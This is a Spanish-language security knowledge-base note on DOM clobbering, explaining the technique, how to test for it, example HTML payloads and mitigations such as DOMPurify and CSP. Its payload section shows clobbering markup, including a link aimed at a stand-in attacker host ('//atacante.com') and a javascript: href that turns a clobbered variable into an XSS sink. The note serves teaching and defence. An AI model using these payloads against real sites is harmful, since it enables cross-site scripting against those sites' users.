---
tags:
  - seguridad-web
  - owasp
  - dom-clobbering
aliases:
  - DOM Clobbering
  - DOM Clobering
---

# DOM Clobbering

**El DOM Clobbering es una técnica que, usando solo HTML (sin JavaScript), sobrescribe variables y propiedades globales del DOM mediante atributos `id`/`name`, aprovechando que el navegador expone los elementos con esos atributos como propiedades de `document` y `window`.** Permite manipular la lógica de páginas que filtran scripts pero no marcado.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Por compatibilidad histórica, un elemento `<a id="x">` queda accesible como `window.x` / `document.x`. Si una aplicación tiene un sink como `if (window.config) { ... }` o `var url = someObj.value || defecto`, el atacante "clobbea" esa referencia inyectando HTML con el `id`/`name` adecuado. Es la vía típica para llegar a XSS cuando solo se permite **HTML sin scripts** (markup injection en sanitizadores como filtros laxos de DOMPurify mal configurados).

## Detección y pruebas
Busca puntos donde se inyecta HTML pero se bloquea `<script>` (comentarios, perfiles, markdown). Identifica en el JS variables globales o accesos tipo `a.b.c` que podrías sobrescribir. Comprueba si `window.NOMBRE` puede crearse vía `id`/`name`.

## Explotación / payloads
**Clobbering simple de una global:**

```html
<a id="config" href="//atacante.com">
<!-- ahora window.config existe y apunta al elemento -->
```

**Acceso anidado** (`object.property`) con `name` dentro de un form o con dos elementos:

```html
<form id="x"><input name="y" value="payload"></form>
<!-- window.x.y -> el input -->

<a id="a"><a id="a" name="b" href="payload">
<!-- window.a.b vía HTMLCollection -->
```

**Sobrescribir un sink hacia XSS** (cuando el valor clobbeado va a un `src`/`href`):

```html
<a id="defaultURL" href="javascript:alert(document.domain)">
```

**Clobbering de tres niveles** con `<iframe>`/`srcdoc` o `form > input`:

```html
<form id="a"><input id="a" name="b"></form>
<form id="a" name="b"><input id="c"></form>
```

## Mitigación
- Sanear HTML con una librería robusta (**DOMPurify** con `SANITIZE_DOM: true`, que ya neutraliza clobbering por defecto) y mantenerla actualizada.
- No depender de variables globales del DOM para decisiones de seguridad; declarar variables con `let`/`const` en ámbitos cerrados.
- Comprobar tipos antes de usar (`if (typeof config === 'object' && !(config instanceof Element))`).
- Aplicar **CSP** para limitar el impacto si el clobbering deriva en ejecución.

## Herramientas
- **DOMPurify** — referencia de saneado correcto (y objetivo de bypass conocido).
- **DOM Invader** (Burp) — detección de sinks DOM y pruebas de clobbering.

---
🔗 Relacionado: [[XSS (Cross-Site Scripting)]] · [[Inyección CSS]] · [[XS-Leaks]] · [[CSRF (Cross-Site Request Forgery)]]
📚 Fuente: [PayloadsAllTheThings — DOM Clobbering](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DOM%20Clobbering) (MIT, © Swissky)
